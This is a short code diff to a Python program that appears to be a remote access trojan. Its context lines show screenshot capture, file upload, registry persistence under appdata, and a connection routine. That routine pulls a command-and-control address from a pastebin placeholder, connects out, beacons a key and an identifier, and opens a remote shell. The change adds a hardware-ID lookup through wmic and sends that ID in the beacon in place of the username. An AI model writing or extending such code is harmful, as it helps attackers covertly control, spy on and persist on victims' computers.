@@ -702,7 +702,9 @@ def upload_file(file_name):
 def screenshot():
     myScreenshot = pyautogui.screenshot()
     myScreenshot.save(appd+'\\screen.png')
-
+def gethwid():
+    hwid = str(subprocess.check_output('wmic csproduct get uuid',shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)).split('\\r\\n')[1].strip('\\r').strip()
+    return hwid
 def persist(reg_name, copy_name):
     file_location = os.environ['appdata'] + '\\' + copy_name
     try:
@@ -722,7 +724,7 @@ def connection():
             cred = get('$pastebin')
             sp = cred.text.split(':')
             s.connect((sp[0], int(sp[1])))
-            s.send('$key'.encode()+":".encode()+getpass.getuser().encode())
+            s.send('$key'.encode()+":".encode()+gethwid().encode())
             shell()
             s.close()
             break
